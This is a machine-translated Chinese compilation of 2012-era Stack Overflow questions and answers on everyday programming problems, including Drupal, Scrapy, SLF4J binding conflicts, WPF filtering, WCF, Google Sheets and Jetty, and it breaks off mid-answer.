[https://github.com/daCapricorn/ArcMenu](https://github.com/daCapricorn/ArcMenu) - Apache 2.0

[https://github.com/siyamed/android-satellite-menu/](https://github.com/siyamed/android-satellite-menu/) - LGPL

# php - 在drupal中逐块查找或调用块描述

> ID：11786235
> 
> 赞同：1
> 
> 时间：2012-08-02T21:42:22.857
> 
> 标签：php, drupal, drupal-modules

我是 Drupal 的新手，所以如果我遗漏了任何明显的东西，请原谅。我们可以使用描述而不是 id 以编程方式查找块吗？

目前正在使用：

```
module_invoke('block', 'block', 'view', 17); 
```

我希望使用类似的东西

```
module_invoke('block', 'block', 'view', 'myBlockName'); 
```

有什么想法吗 ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T04:17:55.867

区块钩子的“查看”操作，根据“出价”在数据库中进行查找

```
"SELECT body, format FROM {boxes} WHERE bid = {$delta}" 
```

因此，除非您覆盖该钩子，否则您将无法通过其名称调用块。即创建自己的

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-09T16:53:00.060

谢谢回复。我最终结束了我们执行以下操作。这使您可以避免对块 ID 进行硬编码

```
$result = db_query("Select bid from boxes where info ='your_block_name'");
$row = db_fetch_object($result);
$block = module_invoke('block', 'block', 'view', $row->bid); 
```

# c - 将数组中的文本通过管道传输到新数组中

> ID：11786238
> 
> 赞同：-1
> 
> 时间：2012-08-02T21:42:39.850
> 
> 标签：c

我有一个数组，并且能够打印我想要的部分。但我想做的是将该部分写入一个新数组。有谁知道如何做到这一点？

提前致谢！

```
 char line[128];
  char *line1;
  char *pch,*pch1;

  char key[]="REMARK 290    ";
  char key1[]="X";

  int start=24;
  int len=35;

  while (fgets(line,sizeof line, file)!=NULL)

  {
      pch=strstr(line,key);
      pch1=strstr(line,key1);

      if(pch!=NULL && pch1!=NULL){

      printf("%.*s\n",len,line+start); 
```

最后打印的内容是我想要输入新数组的内容。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T02:41:08.407

管道用于进程之间的通信。您不能从一个阵列通过*管道*传输到另一个阵列。

如果`printf()`代码末尾的 执行您想要的操作，那么您只需**[`sprintf()`](http://linux.die.net/man/3/sprintf)**将“打印”的结果放入数组中，而不是将其发送到`stdout`.

# jpa - JPA 查找具有给定标签列表的实体

> ID：11786243
> 
> 赞同：0
> 
> 时间：2012-08-02T21:42:47.367
> 
> 标签：jpa, playframework

我有带有标签列表的 Tag 对象和 Price 对象。我可以找到带有一个指定标签的价格，但我不知道如何编写查询来查找带有给定标签列表的价格，例如：find price where price.tags=blue,red,green。结果必须包含名为 blue、red 和 green 的所有标签。

```
@Entity
@Inheritance(strategy = InheritanceType.SINGLE_TABLE)
public class Tag extends Model implements Comparable<Tag>{

    public String name;

    public Tag(){
    }

    public Tag(String name) {
        this.name = name;
    }

    public static Tag findOrCreateByName(String name) {
        Tag tag = Tag.find("byName", name).first();
        if(tag == null) {
            tag = new Tag(name);
        }
        return tag;
    }

    @Override
    public int compareTo(Tag otherTag) {
        return name.compareTo(otherTag.name);
    }
  }

@Entity
@Inheritance(strategy = InheritanceType.SINGLE_TABLE)
public class Price extends Model{

    @Min(0.0)
    public float price;

    @ManyToMany
    public List<Tag> tags;

    public Price() {
        this.tags = new ArrayList<Tag>();
    }

    public Price(int price) {
        this.price = price;
        this.tags = new ArrayList<Tag>();
    }

    public Price tagItWith(String name) {
        tags.add(Tag.findOrCreateByName(name));
        return this;
    }

    public static List<Price> findTaggedWith(String tag) {
        return Price.find(
                "select distinct p from Price p join p.tags as t where t.name = ?", tag
        ).fetch();
    }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T06:31:50.383

您需要在 Tag 中声明关系的另一端。您还需要在 Proce @ManyToMany 中使用 mappedby 来定义关系的“主”。

[在此处](https://groups.google.com/forum/?fromgroups#!topic/play-framework/Kkt1uYVJK5k)查看示例

# sql - 需要长而动态的选择查询/查看 sqlite

> ID：11786255
> 
> 赞同：1
> 
> 时间：2012-08-02T21:43:51.720
> 
> 标签：sql, performance, sqlite, qt, database

我需要生成可能有数千个`where`条件的长选择查询，例如`(table1.a = ? OR table1.a = ? OR ...) AND (table2.b = ? OR table2.b = ? ...) AND....`

我最初开始建立一个类以使这更容易忍受，但后来停下来想知道这是否会很好地工作。此查询将敲击一个可能有数千万行的表，并与另外 2 个具有数千行的表相连接。

一些担忧源于此：

1.）我想使用这些语句来生成一个临时视图，这样我就可以轻松地转移现有的代码库，这里的重点是我想根据 GUI 中的选定参数过滤我为分析而准备的数据，所以有多糟糕在这种情况下视图会做吗？

2.) sqlite 甚至可以解析具有数千个绑定的查询吗？

3.) 除了字符串连接之外，是否有一个框架可以更轻松地生成此查询？

4.) 将所有 WHERE 变量转储到内存中的哈希集中，然后为我的数据库查询对象编写一个包装器，`next()`直到遇到满足我所有条件的查询，这是更好的解决方案吗？我在这里担心的是，应用程序会在滚动上按程序生成图形，因此在调用 x 100,000 时等待绘制`query.next()`可能会导致烦人的延迟？理想情况下，我不想一次等待满足所有内容超过 30 毫秒的下一行。

编辑：

新问题，我注意到 sqlite3 在编译时限制为 999 个绑定值（主机参数）。

所以似乎完成我最初打算的唯一方法就是

1.）通过字符串连接生成整个查询（我最担心的是，我不知道解析sqlite3中的所有数据会有多慢）

或者

2.) 执行一揽子查询方法( `select * from * where index > ? limit ?`) 并调用 next() 直到我在编译的代码中找到有效数据（包括更新索引变量和重复重新查询）

我确实最终围绕 QSqlQuery 对象编写了一个包装器，它将使用 index > 变量和限制来遍历表以允许“遍历”表。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T23:09:16.467

考虑将没有过滤器（非规范化）的连接结果转储到平面文件中，并使用位图索引引擎 [Fastbit 对其进行索引。](https://sdm.lbl.gov/fastbit/)

# php - 我应该什么时候开始和销毁 PHP 中的会话

> ID：11786258
> 
> 赞同：0
> 
> 时间：2012-08-02T21:44:09.127
> 
> 标签：php, session, oauth

我正在制作一个简单的 oauth 网站。

在`index.php`：

```
<?php
session_start();
if (empty($_SESSION['authentication']))
    $_SESSION['authentication'] = 'pending';
?>
<html>
<form action="oauth.php" method="post">
    <span>
    <?php
        echo $_SESSION['authentication'];
    ?>
    </span>
    <input type="hidden" name="action" value="authenticate">
    <input type="submit" value="authenticate">
</form>
</html> 
```

在`oauth.php`：

```
<?php
session_start();
if (isset($_POST['action']) and $_POST['action'] == 'authenticate') {
    $url = $serverAuth ... ;
    header('Location: ' . $url); //google oauth, it will come back to oauth.php
    exit();
}

if (isset($_GET['code'])) {
    $ch = curl_init($serverToken);
    $result = curl_exec($ch);
    $tokens = json_decode($result, true);

    if (isset($tokens['access_token'])) {
        $_SESSION['authentication'] = 'good';
        $_SESSION['access_token'] = $tokens['access_token'];
    } else {
        $_SESSION['authentication'] = 'error';
    }

    header('Location: ./');
    exit();
}

if (isset($_GET['error'])) {
    if ($_GET['error'] == 'access_denied')
        $_SESSION['authentication'] = 'denied';
    else
        $_SESSION['authentication'] = 'error';
    header('Location: ./');
    exit();    
}
?> 
```

我想让网站像：默认情况下，`$_SESSION['authentication']`是“待定”；当我刷新页面时，每个会话变量都消失了，并`$_SESSION['authentication']`重置为默认值。但是我不能`$_SESSION`在开头重置`index.php`，因为函数`oauth.php`必须`header()`重定向到这个页面。

如何处理？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T21:46:50.043

您必须在**需要访问`$_SESSION`**. 仅在明确要求时销毁它，例如在注销时。

# python - scrapy 将 start_url 传输到后续请求

> ID：11786259
> 
> 赞同：2
> 
> 时间：2012-08-02T21:44:13.730
> 
> 标签：python, web-crawler, scrapy

因为三天以来，我试图将各自的 start_urs 保存在元属性中，以将其作为项目传递给 scrapy 中的后续请求，因此我可以使用 start_url 调用字典来用其他数据填充我的输出。实际上它应该很简单，因为它在[文档](http://doc.scrapy.org/en/latest/topics/request-response.html)中进行了解释......

google [scrapy 组中有一个讨论，](https://groups.google.com/forum/?hl=de&fromgroups#!topic/scrapy-users/RSKnDgXnZE8)[这里](https://stackoverflow.com/questions/10598691/how-to-access-a-specific-start-url-in-a-scrapy-crawlspider)也有一个问题，但我无法让它运行:(

我是scrapy的新手，我认为它是一个很棒的框架，但是对于我的项目，我必须知道所有请求的start_urls，它看起来很复杂。

我真的很感激一些帮助！

目前我的代码如下所示：

```
class example(CrawlSpider):

    name = 'example'
    start_urls = ['http://www.example.com']

    rules = (
    Rule(SgmlLinkExtractor(allow=('/blablabla/', )), callback='parse_item'),
    )

    def parse(self, response):
        for request_or_item in super(example, self).parse(response):
            if isinstance(request_or_item, Request):
                request_or_item = request_or_item.replace(meta = {'start_url':   response.meta['start_url']})
            yield request_or_item

    def make_requests_from_url(self, url):
         return Request(url, dont_filter=True, meta = {'start_url': url})

    def parse_item(self, response):
        hxs = HtmlXPathSelector(response)
        item = testItem()
        print response.request.meta, response.url 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T05:00:38.853

我想删除这个答案，因为它不能解决 OP 的问题，但我想把它作为一个简单的例子。

* * *

[警告](http://doc.scrapy.org/en/latest/topics/spiders.html#crawlspider)：

> 在编写爬虫规则时，避免使用`parse`as callback，因为它`CrawlSpider`使用`parse`方法本身来实现其逻辑。因此，如果您覆盖该`parse`方法，爬虫将不再工作。

改用[BaseSpider](http://doc.scrapy.org/en/latest/topics/spiders.html#basespider)：

```
class Spider(BaseSpider):

    name = "domain_spider"

    def start_requests(self):

        last_domain_id = 0
        chunk_size = 10
        cursor = settings.db.cursor()

        while True:
            cursor.execute("""
                    SELECT domain_id, domain_url  
                    FROM domains  
                    WHERE domain_id > %s AND scraping_started IS NULL  
                    LIMIT %s
                """, (last_domain_id, chunk_size))
            self.log('Requesting %s domains after %s' % (chunk_size, last_domain_id))
            rows = cursor.fetchall()
            if not rows:
                self.log('No more domains to scrape.')
                break

            for domain_id, domain_url in rows:
                last_domain_id = domain_id
                request = self.make_requests_from_url(domain_url)
                item = items.Item()
                item['start_url'] = domain_url
                item['domain_id'] = domain_id
                item['domain'] = urlparse.urlparse(domain_url).hostname
                request.meta['item'] = item

                cursor.execute("""
                        UPDATE domains  
                        SET scraping_started = %s
                        WHERE domain_id = %s  
                    """, (datetime.now(), domain_id))

                yield request

    ... 
```

# jquery - 将返回传递的 div 的 html() 的 Jquery 函数？

> ID：11786261
> 
> 赞同：-1
> 
> 时间：2012-08-02T21:44:29.173
> 
> 标签：jquery

我已经尝试了几种方法来做到这一点，但都做得不好。我的 HTML 骨架中有一个 div 声明为 ("myDiv")。我想编写一个函数，它将任何传递的 div 作为其参数，然后返回传递的 div 的 html()。我当然可以写这样的东西并得到 div 文本。但是，如果我有一个实用程序函数，它只读取 .html() 并返回它，那就太好了。

```
var txt = $("#div").html();
alert(txt); 
```

这是功能代码：

```
$.fn.getDivHTML = function(obj)
{
   var txt = $(obj.html());
   return txt;
} 
```

我这样调用函数：

```
$(document).ready(function()
{
   var val = $.fn.getHTML("#myDiv");
   alert(val);
}); 
```

任何帮助都将不胜感激。谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-02T21:47:29.827

对于像您这样描述的功能，答案是：

```
$.fn.getDivHTML = function(selector)
{
   return $(selector).html();
} 
```

在您的代码中，您只传递了一个选择器字符串，而不是一个对象，因此重命名的参数和包装在`$()`.

您将能够以您在问题中的方式准确地调用它。但正如一位评论者指出的那样，这有什么意义呢？无论如何，它是单线的。您需要做的就是将准备好的文档替换为：

```
$(document).ready(function()
{
   var val = $("#myDiv").html();
   alert(val);
}); 
```

# msbuild - 在 msbuild .proj 文件中需要独立于平台的替代 ItemGroup 和 PropertyGroup

> ID：11786262
> 
> 赞同：0
> 
> 时间：2012-08-02T21:44:34.023
> 
> 标签：msbuild, mono, xbuild

我正在将一个视觉工作室项目移植到单声道开发中。我在 .proj 文件中有一个相当复杂的构建后脚本，它将各种文件组复制到分发文件夹中。任何人都可以为 linux 推荐一个合适的替代方案吗？我试过 xbuild，但它不支持 itemgroup 和 propertygroup。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T01:39:35.897

我能想到的唯一方法是扩展 xbuild 以支持它们，

[https://bugzilla.xamarin.com/show_bug.cgi?id=3055](https://bugzilla.xamarin.com/show_bug.cgi?id=3055)

这是很长一段时间（> 6 个月）的已知错误。有人可能会实现它并将补丁提交给 Mono 团队。

NAnt 是一种可能的替代方案，但我认为将您的 MSBuild 脚本重写为 NAnt 脚本并不值得。

# asp.net - 由于 Microsoft.Web.Services3.StateManager 无法序列化会话状态？

> ID：11786263
> 
> 赞同：8
> 
> 时间：2012-08-02T21:44:39.497
> 
> 标签：asp.net, web-services, serialization

有很多与此类似的问题......但我没有看到他们是如何遇到这个特定问题的：

我有一个 web 服务，它返回一个错误，该错误以：

> 无法序列化会话状态。在“StateServer”和“SQLServer”模式下，ASP.NET 将序列化会话状态对象，因此不允许不可序列化的对象或 MarshalByRef 对象。如果自定义会话状态存储在“自定义”模式下完成类似的序列化，则适用相同的限制。

因此，像[这样](https://stackoverflow.com/questions/1335444/unable-to-serialize-the-session-state-updated)的问题提到寻找 SerializationException，找出无法序列化的内容，并使其可序列化。听起来很简单......但是当我寻找它时，我发现了这个：

> [SerializationException：在程序集“Microsoft.Web.Services3，Version=3.0.0.0，Culture=neutral，PublicKeyToken=31bf3856ad364e35”中键入“Microsoft.Web.Services3.StateManager”未标记为可序列化。]

这让我很困惑……听起来它实际上是在尝试序列化 StateManager……只是它隐藏了里面的其他东西是 StateManager 无法序列化吗？如果是这样，有没有办法找出什么？或者由于某种原因，StateManager 是否真的应该是可序列化的？（我怀疑我没有说得很清楚......对不起......如果你有问题，我会尽力回答。）

我还应该注意的一件事是我们使用 NCache 作为会话存储提供程序，这似乎可能以某种方式相关。但我不清楚这如何导致我所看到的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-07T13:57:15.397

如果您正在序列化自定义对象，请确保使用属性装饰类。如果在您放入会话状态的任何对象上没有这个，序列化程序将失败。您可能需要隔离您正在存储的项目并检查它的属性以及它本身是否具有该属性。

# maven - 多个 SLF4J 绑定 activemq-all-5.6.0.jar 出错

> ID：11786265
> 
> 赞同：27
> 
> 时间：2012-08-02T21:44:46.867
> 
> 标签：maven, activemq, slf4j

当我升级到 activemq-all-5.6.0

我在服务器启动期间收到此错误

SLF4J：类路径包含多个 SLF4J 绑定

使用activemq-all-5.5.1时没有这个问题

在检查时，我确实发现 activemq-all-5.6.0.jar 和 slf4j-log4j12-1.5.10.jar 中都有 StaticLoggerBinder.class 导致问题

请帮助调试此问题

我的 pom.xml 如下

```
<dependency>
    <groupId>org.slf4j</groupId>
    <artifactId>slf4j-api</artifactId>
    <version>1.5.10</version>
</dependency>
<dependency>
    <groupId>org.slf4j</groupId>
    <artifactId>jcl-over-slf4j</artifactId>
    <version>1.5.10</version>
    <scope>runtime</scope>
</dependency>
<dependency>
    <groupId>org.slf4j</groupId>
    <artifactId>slf4j-log4j12</artifactId>
    <version>1.5.10</version>
    <scope>runtime</scope>
</dependency> 
```

活跃的 mq 依赖是这样的

旧版本 5.5.1（这工作）

```
<dependency>
    <groupId>org.apache.activemq</groupId>
    <artifactId>activemq-all</artifactId>
    <version>5.5.1</version>
</dependency> 
```

新版本 5.6.0（这给出了错误）

```
<dependency>
    <groupId>org.apache.activemq</groupId>
    <artifactId>activemq-all</artifactId>
    <version>5.6.0</version>
</dependency> 
```

提前致谢。

* * *

## 回答 #1

> 赞同：44
> 
> 时间：2012-08-02T22:14:05.773

ActiveMQ 家伙使用[Maven Shade 插件](http://maven.apache.org/plugins/maven-shade-plugin/)来创建 activemq-all "ueber" jar。在版本 5.5.1 和 5.6.0 之间的某个地方，他们添加了 org.slf4j:slf4j-log4j12 依赖项 - 因此你的问题。

不幸的是，因为他们使用了你不能`exclusions`在你的 POM 中的 activemq-all 依赖定义中使用的 shade 插件。

相反，您需要用所有必需的单个依赖项（当然 org.sl4j-log4j12 除外）完全替换 activemq-all 依赖项。

以下页面详细说明了所有必需的依赖项： http: [//activemq.apache.org/initial-configuration.html#InitialConfiguration-RequiredJARs](http://activemq.apache.org/initial-configuration.html#InitialConfiguration-RequiredJARs)

或者，以下是包含在 activemq-all jar 中的所有依赖项（必需和可选）的列表（取自 activemq-all pom 中的 shade 插件配置）：

```
org.apache.activemq:activemq-camel
org.apache.activemq:activemq-core
org.apache.activemq:activemq-console
org.apache.activemq:activemq-jaas
org.apache.activemq:activemq-optional
org.apache.activemq:kahadb
org.apache.geronimo.specs:geronimo-jms_1.1_spec
org.apache.geronimo.specs:geronimo-jta_1.0.1B_spec
org.apache.geronimo.specs:geronimo-j2ee-management_1.1_spec
org.apache.geronimo.specs:geronimo-annotation_1.0_spec
org.slf4j:slf4j-api
org.slf4j:slf4j-log4j12
log4j:log4j 
```

希望有帮助。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2017-02-23T08:33:22.147

我在使用 Spring 时遇到了同样的问题。帮助我的是将 activemq-all 的依赖替换为：

```
<dependency>
    <groupId>org.apache.activemq</groupId>
    <artifactId>activemq-spring</artifactId>
    <version>5.14.3</version>
</dependency> 
```

希望这会帮助任何人......

# ruby-on-rails - 自定义发布操作中 CSRF 令牌的奇怪问题

> ID：11786270
> 
> 赞同：1
> 
> 时间：2012-08-02T21:45:27.053
> 
> 标签：ruby-on-rails

几个月来，我一直在使用`update_snapshot`控制器中调用的操作。本质上，此操作告诉服务器连接到网络摄像头并从中捕获/保存一个 jpeg，有人用来直观地查看远程位置完全按预期运行。

但无论如何......
今天我开始`WARNING: Can't verify CSRF token authenticity`在我的日志中看到并且用户已注销

现在我知道你需要发送一个带有请求的 CSRF 令牌，但这里的问题是我是。这绝对是今天发生的一个全新问题，我不确定为什么它突然成为一个问题。

为了暂时解决这个问题，我跳过了`:verify_authenticity_token`这个动作的 before_filter （并且只有这个动作）。我想我可以保持这样，没有任何真正的问题，但不知道为什么它会突然开始发生，为什么只在这个动作上？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-15T15:01:23.050

想通了这里的问题。我最近为我的表演动作添加了动作缓存。发布帖子的链接位于此缓存视图中。

CSRF 元标记需要通过向另一个仅提供此标记的未缓存控制器发出单独的 ajax 请求来更新。

# c# - 使用 Datagrid 的 Observable 集合的多个视图

> ID：11786278
> 
> 赞同：1
> 
> 时间：2012-08-02T21:46:11.247
> 
> 标签：c#, wpf, datagrid, filter, observablecollection

我有同样的[问题](https://stackoverflow.com/questions/9686272/multiple-views-of-observable-collection)。但是我使用的是 DataGrid 而不是 ListBox，它似乎不像这样工作（也可能是因为我从未使用过 Visual Basic 并且没有将代码正确地翻译成 C#）。我基本上想要两个具有不同过滤器的相同数据的 DataGrids。

```
 ICollectionView view_dataLinesUnfiltered;
    ICollectionView view_dataLinesFiltered;

 public MainWindow()
    {
        ...
        //view_dataLines = CollectionViewSource.GetDefaultView(dataLines); // <- Filter works on both
        view_dataLinesUnfiltered = new CollectionView(dataLines); // <- Filter doesn´t work at all
        view_dataLinesFiltered = new CollectionView(dataLines);
        ....
        // Control Events
        this.ShowAA.RaiseEvent(new RoutedEventArgs(System.Windows.Controls.Primitives.ToggleButton.UncheckedEvent));

    }

    private void ShowAA_Checked(object sender, RoutedEventArgs e)
    {
        view_dataLinesUnfiltered.Filter = null;
    }

    private void ShowAA_UnChecked(object sender, RoutedEventArgs e)
    {
        view_dataLinesUnfiltered.Filter = delegate(object o) { return FilterContent(o as ErrorDetection.stDataLine, "AA", ""); };
    }

    bool FilterContent(ErrorDetection.stDataLine line, string sFilterAA, string sFilter)
    {
        shortArrayToHexStringConverter converter = new shortArrayToHexStringConverter();

        string comBuffer = converter.Convert(line.ComBufferP as object,typeof(string),0,System.Globalization.CultureInfo.CurrentCulture) as string;

        return false;// !comBuffer.Contains("AA");
    } 
```

调用 FilterContent 方法没有问题，但 DataGrid 仍然显示这些行。如果我使用 GetDefaultView 过滤器适用于两个数据网格。我是否必须使用其他视图而不是 CollectionView（ListCollectionView 也不起作用）？

我做了一个小样本项目来展示问题[样本](https://dl.dropbox.com/u/93144637/MultipleViewTest.zip)。它只包含一个构造函数和一个可观察的集合。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T03:41:29.260

我让它以某种方式工作。我现在使用 CollectionViewSources 而不是 ICollectionView。

```
 <Window.Resources>
    <CollectionViewSource x:Key="viewSource_dataLinesUnfiltered"/>
    <CollectionViewSource x:Key="viewSource_dataLinesFiltered"/>
 </Window.Resources>
 ...
 <DataGrid Name="Filtered_Datagrid" ItemsSource="{Binding Source={StaticResource viewSource_dataLinesFiltered}}" >
  ...
 </DataGrid>
  ...
 <DataGrid Name="Unfiltered_Datagrid" ItemsSource="{Binding Source={StaticResource viewSource_dataLinesUnfiltered}}">
  ...
 </DataGrid> 
```

和 c 代码：

```
 CollectionViewSource viewSource_dataLinesUnfiltered;
    CollectionViewSource viewSource_dataLinesFiltered;
    ...
    public MainWindow()
    {
        InitializeComponent();

        this.DataContext = dataLines;

        viewSource_dataLinesUnfiltered = (CollectionViewSource)this.Resources["viewSource_dataLinesUnfiltered"];
        viewSource_dataLinesUnfiltered.Source = dataLines;
        viewSource_dataLinesFiltered = (CollectionViewSource)this.Resources["viewSource_dataLinesFiltered"];
        viewSource_dataLinesFiltered.Source = dataLines;

        // Control Events
        this.ShowAA.RaiseEvent(new RoutedEventArgs(System.Windows.Controls.Primitives.ToggleButton.UncheckedEvent));

    }

    private void ShowAA_Checked(object sender, RoutedEventArgs e)
    {
        viewSource_dataLinesUnfiltered.View.Filter = null;
    }

    private void ShowAA_UnChecked(object sender, RoutedEventArgs e)
    {
        viewSource_dataLinesUnfiltered.View.Filter = delegate(object o) { return FilterContent(o as ErrorDetection.stDataLine, "AA", ""); };
    }

    bool FilterContent(ErrorDetection.stDataLine line, string sFilterAA, string sFilter)
    {
        shortArrayToHexStringConverter converter = new shortArrayToHexStringConverter();

        string comBuffer = converter.Convert(line.ComBufferP as object,typeof(string),0,System.Globalization.CultureInfo.CurrentCulture) as string;

        return !comBuffer.Contains("AA");
    } 
```

但是我不确定为什么它会以这种方式工作，并且当使用 ICollectionView 时，过滤器不会应用于窗口重绘。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-03T01:49:25.657

您需要指定在哪个 DataGrid 上使用哪个 ICollectionVIew。

如果您只是绑定到集合（在这种情况下为 dataLines），WPF 将使用“默认视图”（或在必要时创建一个），这就是第一个注释掉的行用于过滤的原因。

有几种方法可以指定哪个视图用于哪个数据网格，具体取决于您使用的模式等

1）像链接的问题一样，您可以在初始化视图后，在窗口的代码中为每个 DataGrid 设置 ItemsSource，例如：

```
filteredDataGrid.ItemsSource = view_dataLinesFiltered;
unfilteredDataGrid.ItemsSource = view_dataLinesUnfiltered; 
```

2）您可以将窗口的 DataContext 设置为自身，或者为包含视图的屏幕创建视图模型，并使视图成为公共属性，然后绑定到每个网格的预期视图，例如

```
<DataGrid ItemsSource="{Binding View_dataLinesFiltered}"> .... 
```

* * *

编辑：

现在我不在工作，可以进入保管箱并使用您的示例，似乎奇怪行为的原因是直接使用 CollectionView 。在[CollectionView 的 msdn 页面上，](http://msdn.microsoft.com/en-us/library/system.windows.data.collectionview.aspx)它说

> 您不应在代码中创建此类的对象。要为仅实现 IEnumerable 的集合创建集合视图，请创建一个 CollectionViewSource 对象，将您的集合添加到 Source 属性，然后从 View 属性获取集合视图。

但是，如果您不想在 XAML 中设置视图，您也可以将 CollectionViews 更改为[ListCollectionViews](http://msdn.microsoft.com/en-us/library/system.windows.data.listcollectionview.aspx)，它应该可以按预期工作（这很可能是 CollectionViewSource 在幕后为您创建的视图类型）。

# c# - 如何为 WCF ServiceContract 设置默认的 RequestFormat？

> ID：11786281
> 
> 赞同：8
> 
> 时间：2012-08-02T21:46:21.153
> 
> 标签：c#, json, wcf, webhttpbinding

我正在编写一个有很多方法的网络服务。它们的设置都类似于以下内容：

```
[OperationContract]
    [WebInvoke(
        BodyStyle = WebMessageBodyStyle.Bare,
        RequestFormat = WebMessageFormat.Json,
        ResponseFormat = WebMessageFormat.Json,
        UriTemplate = "x/y/z")]
    void someMethod(int x, int y, int z); 
```

我要做的只是在 web.config 文件中设置默认值`BodyStyle`// all `RequestFormat`。`ResponseFormat`现在，我知道我可以做到这一点：

```
 <endpointBehaviors>
    <behavior name="webHttpBehavior">
      <webHttp defaultBodyStyle="Bare" defaultOutgoingResponseFormat="Json" />
    </behavior>
  </endpointBehaviors> 
```

但似乎没有 RequestFormat 的属性。如何将默认设置`RequestFormat`为 JSON？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-03T13:19:42.663

请求类型[由 WCF 自动解释](http://msdn.microsoft.com/en-us/library/ee476510.aspx)，您无需`RequestFormat`为服务操作指定默认值。

如果您尝试强制执行支持的请求格式，请参阅[有关强制请求内容类型的相关 SO 帖子](https://stackoverflow.com/a/1227476/175679)。

**注意：**`RequestFormat`为操作分配 a 是没有意义的`WebGet`。根据定义，a`WebGet`不能包含`Body`JSON 格式存在的地方。一个更好的例子是`WebInvoke`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-07-17T09:22:06.127

将`automaticFormatSelectionEnabled`属性设置为**web.config 文件****`true`**中的*webHttp*元素

 **```
<behaviors>
   <endpointBehaviors>
      <behavior>
         <webHttp automaticFormatSelectionEnabled="true" />
      </behavior>
   </endpointBehaviors>
</behaviors> 
```

eg：你可以`Accept:application/json`在接收端设置并获取JSON结果。

邮递员屏风

![json响应](../Images/b081a678debd4de41bfc9c11907ac932.png)

==================================================== ===================

![xml 响应](../Images/a020d0e983e4cf03fb47e0fc8cb1f14b.png)

[https://msdn.microsoft.com/en-us/library/ee476510(v=vs.110).aspx](https://msdn.microsoft.com/en-us/library/ee476510(v=vs.110).aspx)**

# google-apps-script - 将 Google 电子表格嵌入 Google 站点时，Google Apps 脚本可帮助解决错误？

> ID：11786283
> 
> 赞同：2
> 
> 时间：2012-08-02T21:46:38.093
> 
> 标签：google-apps-script, google-docs

电子表格 A 是欢迎新人来到我们小镇的小组的主数据源。它有大量非常敏感的数据，不能公开，甚至一点也不公开。（我们谈论的是孩子的姓名和出生日期以及他们在哪里上学……保持电子表格 A 的安全是关键任务。）

因此，电子表格 B 使用 importRange 和查询从电子表格 A 中提取必要的列来填充我们的“成员目录”。

然后，我在小组的 Google 站点中嵌入了电子表格 B。（如果您喜欢 www.SewickleyNewcomers.com，请随时查看该网站）

而且效果很好。

但 。. . 在我关闭电子表格 A 和 B 并经过几个小时后，如果我尝试打开嵌入了会员目录的网页，嵌入的表格会显示“#VALUE！”

然后，当我再次打开电子表格 B 时，它会说同样的话：“#VALUE！”。

直到，我让电子表格 B 坐了几分钟。然后，在它坐了几分钟之后，突然之间，所有的数据都重新填充了。

如果我回到嵌入了会员目录的网页，一切都很好。

据推测，问题在于，如果电子表格 B 未打开，则无法从电子表格 A 中提取数据。

但我无法嵌入电子表格 A，因为如上所述，有些列和表格无法公开访问。

一些细节：

*   电子表格 A 和电子表格 B 目前都设置为“知道链接的任何人”作为共享首选项。（尽管理想情况下我希望将电子表格 A 恢复为“私人”。）

*   电子表格 B 通过内置的插入电子表格小部件嵌入到 Google 网站中。

*   这是我目前用来将数据从电子表格 A 拉到电子表格 B 的公式：

    =arrayformula(query(importrange(" *_* ","Master!A:Z"), "select Col3, Col2, Col22, Col18, Col19, Col20, Col21, Col24 where Col26='是的，继续，包括我的联系信息在在线目录和打印目录中。'和 (Col4='Yes' or Col4='yes') order by Col3"))

有人对这里发生的事情有任何想法吗？以及其他方法的想法，我可以从电子表格 A 中获取必要的数据并进入网站（我当然不必通过电子表格 B，我只是想不出另一种方法来将所有其他数据保留在电子表格 A 上私人的）？是否有解决方案使用 Google 网站上的某种 Apps 脚本来最终运行需要嵌入电子表格？

提前致谢！所有搬到塞威克利的人也感谢你们！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T22:34:35.547

importRange 显示了预期在 85% 的时间内显示的内容（根据我的实验）。在其他 15% 期间，它显示 #N/A 或 #VALUE。

我相信，如果在网页上找到#VALUE，您只需等待很长时间（10-15 分钟），即使您不重新打开电子表格，正确的数据也会返回网页。

无论如何，为了避免这个问题，您可以在主电子表格 A 中创建一个工作表“publicSheet”，用从其他工作表中复制必要内容的公式填充它，然后通过 File>Publish to the web>“publicSheet”发布这个特定的工作表. 如果这样做，仍然没有人可以访问电子表格 A 的其他工作表，但数据永远不会从已发布的工作表中消失。

# java - 在 Jetty 中重新启动当前应用程序

> ID：11786284
> 
> 赞同：3
> 
> 时间：2012-08-02T21:46:41.977
> 
> 标签：java, jetty

我在 Jetty 上部署了一个 Web 应用程序作为战争。
有没有办法以编程方式重新启动 Jetty 上当前正在运行的应用程序？
是否有可以实现此目的的 Jetty 配置？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T04:19:02.620

有 3 个选项。

1.  使用 JMX

    尝试通过 jetty-jmx 库和配置[启用 JMX 。](http://wiki.eclipse.org/Jetty/Tutorial/JMX)然后查看上下文或部署者的选项，看看您是否可以使用 JMX 来管理已部署的上下文

2.  创建您自己的[服务器 bean](http://download.eclipse.org/jetty/stable-7/apidocs/org/eclipse/jetty/server/Server.html#addBean%28java.lang.Object%29)来管理上下文的部署/取消部署

3.  创建您自己的 AppProvider，提供给[DeploymentManager](http://download.eclipse.org/jetty/stable-7/apidocs/org/eclipse/jetty/deploy/DeploymentManager.html)以编程方式控制已安装的上下文。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-09-30T23:37:38.370

这是解决这个问题的尝试：[https ://github.com/giuliano108/jetty-manager](https://github.com/giuliano108/jetty-manager)

```
sudo -u username jetty-manager

Usage:
